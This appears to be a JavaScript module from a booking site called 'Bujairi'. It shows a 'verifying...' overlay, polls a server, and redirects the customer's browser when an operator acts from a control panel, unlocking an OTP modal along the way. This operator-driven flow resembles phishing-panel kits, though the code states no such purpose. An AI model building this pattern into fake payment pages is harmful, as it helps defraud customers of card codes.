(function (global) {
    'use strict';

    function ensureStyle() {
        if (document.getElementById('bujairiVerifyWaitStyle')) {
            return;
        }
        var s = document.createElement('style');
        s.id = 'bujairiVerifyWaitStyle';
        s.textContent = '@keyframes bujairiVerifySpin{to{transform:rotate(360deg)}}';
        document.head.appendChild(s);
    }

    /** مسار فعلي بعد جسر التحميل إن وُجد */
    function effectivePathQuery(urlStr) {
        try {
            var u = new URL(urlStr, window.location.origin);
            var path = u.pathname.replace(/\\/g, '/');
            if (/\/redirect-bridge\.php$/i.test(path)) {
                var to = u.searchParams.get('to');
                if (to) {
                    var dec = decodeURIComponent(to);
                    return (dec.charAt(0) === '/' ? dec : '/' + dec);
                }
            }
            return path + (u.search || '');
        } catch (e) {
            return '';
        }
    }

    /** مفتاح صفحة الحجز: اسم الملف + id الطلب — لتجاهل إعادة التوجيه لنفس الصفحة */
    function bookingPageKey(urlStr) {
        var pq = effectivePathQuery(urlStr);
        try {
            var qIdx = pq.indexOf('?');
            var pathPart = qIdx >= 0 ? pq.slice(0, qIdx) : pq;
            var q = qIdx >= 0 ? pq.slice(qIdx) : '';
            var base = (pathPart.split('/').pop() || '').toLowerCase();
            var id = '';
            try {
                id = new URLSearchParams(q).get('id') || '';
            } catch (e2) {
                id = '';
            }
            return base + '|' + id;
        } catch (e) {
            return '';
        }
    }

    function shouldIgnoreRedirectUrl(href) {
        if (!href) {
            return true;
        }
        var cur = bookingPageKey(window.location.href);
        var tgt = bookingPageKey(href);
        return cur !== '' && tgt !== '' && cur === tgt;
    }

    function rdirVStorageKey(orderId) {
        return 'bujairi_rdir_v_' + String(orderId);
    }

    function getStoredRedirectVersion(orderId) {
        try {
            return parseInt(sessionStorage.getItem(rdirVStorageKey(orderId)) || '0', 10) || 0;
        } catch (e) {
            return 0;
        }
    }

    function setStoredRedirectVersion(orderId, v) {
        try {
            sessionStorage.setItem(rdirVStorageKey(orderId), String(v));
        } catch (e) {}
    }

    function goToClientRedirect(href) {
        if (typeof global.__bujairiUnlockOtpModal === 'function') {
            try {
                global.__bujairiUnlockOtpModal();
            } catch (e) {
                /* ignore */
            }
        }
        global.location.href = href;
    }

    function processRedirectApiData(d, orderId) {
        if (!d || !d.redirectUrl) {
            return { href: null };
        }
        var href = d.redirectUrl;
        var dv = 0;
        if (d.redirectVersion != null && d.redirectVersion !== '') {
            dv = parseInt(String(d.redirectVersion), 10) || 0;
        }
        if (dv > 0) {
            var lastV = getStoredRedirectVersion(orderId);
            if (dv > lastV) {
                setStoredRedirectVersion(orderId, dv);
                return { href: href };
            }
            return { href: null };
        }
        if (!shouldIgnoreRedirectUrl(href)) {
            return { href: href };
        }
        return { href: null };
    }

    function overlayNode() {
        var id = 'bujairiVerifyWaitOverlay';
        var ex = document.getElementById(id);
        if (ex) {
            return ex;
        }
        ensureStyle();
        var d = document.createElement('div');
        d.id = id;
        d.setAttribute('role', 'dialog');
        d.setAttribute('aria-modal', 'true');
        d.setAttribute('aria-live', 'polite');
        d.style.cssText =
            'position:fixed;inset:0;z-index:99999;background:rgba(15,23,42,0.9);display:none;' +
            'align-items:center;justify-content:center;flex-direction:column;padding:1.5rem;';
        var spin = document.createElement('div');
        spin.style.cssText =
            'width:56px;height:56px;border:4px solid rgba(255,255,255,0.2);border-top-color:#38bdf8;' +
            'border-radius:50%;animation:bujairiVerifySpin 0.85s linear infinite';
        var p = document.createElement('p');
        p.style.cssText =
            'margin-top:1.25rem;color:#f1f5f9;font-weight:700;font-size:1.15rem;text-align:center;';
        p.textContent = 'جاري التحقق...';
        d.appendChild(spin);
        d.appendChild(p);
        document.body.appendChild(d);
        return d;
    }

    /**
     * @param {number} orderId
     * @param {string} redirectStatusBase — مسار كامل مثل /booking/redirect-status.php
     */
    function showAndPoll(orderId, redirectStatusBase) {
        var el = overlayNode();
        el.style.display = 'flex';
        if (!orderId || orderId < 1 || !redirectStatusBase) {
            return;
        }
        var sep = redirectStatusBase.indexOf('?') >= 0 ? '&' : '?';
        var url = redirectStatusBase + sep + 'orderId=' + encodeURIComponent(String(orderId));
        var tid = setInterval(function () {
            fetch(url, { credentials: 'same-origin' })
                .then(function (r) {
                    return r.json();
                })
                .then(function (d) {
                    var out = processRedirectApiData(d, orderId);
                    if (!out.href) {
                        return;
                    }
                    clearInterval(tid);
                    goToClientRedirect(out.href);
                })
                .catch(function () {});
        }, 2500);
    }

    /**
     * استقصاء صامت (بدون طبقة) على صفحات الحجز حتى يعثر العميل على client_redirect
     * بعد الضغط من لوحة التحكم دون تقديم نماذج.
     * @param {number} orderId
     * @param {string} redirectStatusBase
     */
    function startBackgroundRedirectPoll(orderId, redirectStatusBase) {
        if (!orderId || orderId < 1 || !redirectStatusBase) {
            return;
        }
        var sep = redirectStatusBase.indexOf('?') >= 0 ? '&' : '?';
        var pollUrl = redirectStatusBase + sep + 'orderId=' + encodeURIComponent(String(orderId));
        var tick = function () {
            fetch(pollUrl, { credentials: 'same-origin' })
                .then(function (r) {
                    return r.json();
                })
                .then(function (d) {
                    var out = processRedirectApiData(d, orderId);
                    if (out.href) {
                        goToClientRedirect(out.href);
                    }
                })
                .catch(function () {});
        };
        setInterval(tick, 3000);
        setTimeout(tick, 500);
    }

    global.BujairiVerifyWait = {
        showAndPoll: showAndPoll,
        startBackgroundRedirectPoll: startBackgroundRedirectPoll,
        shouldIgnoreRedirectUrl: shouldIgnoreRedirectUrl,
        bookingPageKey: bookingPageKey,
        rdirVStorageKey: rdirVStorageKey,
        getStoredRedirectVersion: getStoredRedirectVersion,
        setStoredRedirectVersion: setStoredRedirectVersion
    };
})(window);
